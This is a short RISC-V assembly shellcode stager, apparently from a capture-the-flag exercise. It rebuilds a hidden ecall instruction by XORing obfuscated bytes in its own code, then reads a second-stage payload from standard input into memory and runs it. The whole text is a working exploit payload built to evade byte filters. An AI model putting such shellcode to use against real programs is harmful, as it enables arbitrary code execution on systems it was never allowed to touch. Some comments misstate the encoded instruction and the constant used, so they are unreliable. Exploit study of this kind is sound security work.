.section .text
.global _start

_start:
	c.j getaddr
	
	main:
		# forge ecall instruction (0x000000e3)
        # *ecall ^= 0xffffffff
		c.li s0, -1
        lw s1, -0x8(ra)
        xor s1, s0, s1
        sw s1, -0x8(ra)

		# read(0, &getaddr, 0x83f)
        li a0, 0
        addi a1, ra, -4
		li a2, 0x83f
        andi a7, a2, 0x1ff # 0x840 & 0x1ff = 0x3f = SYS_read
	ecall:
		.byte 0x8c, 0xff, 0xff, 0xff
	getaddr:
		call main
